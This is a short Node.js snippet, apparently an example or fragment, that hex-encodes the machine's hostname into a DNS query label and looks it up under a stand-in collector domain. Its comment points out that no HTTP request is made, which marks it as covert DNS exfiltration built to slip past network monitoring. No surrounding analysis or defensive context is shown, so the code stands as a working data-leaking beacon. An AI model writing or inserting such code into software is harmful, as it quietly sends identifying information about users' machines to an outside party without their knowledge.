const dns = require("dns"), os = require("os");
// The hostname is encoded into a DNS query; no HTTP request is ever made.
const label = Buffer.from(os.hostname()).toString("hex").slice(0, 48);
dns.lookup(label + ".collector.invalid", () => {});
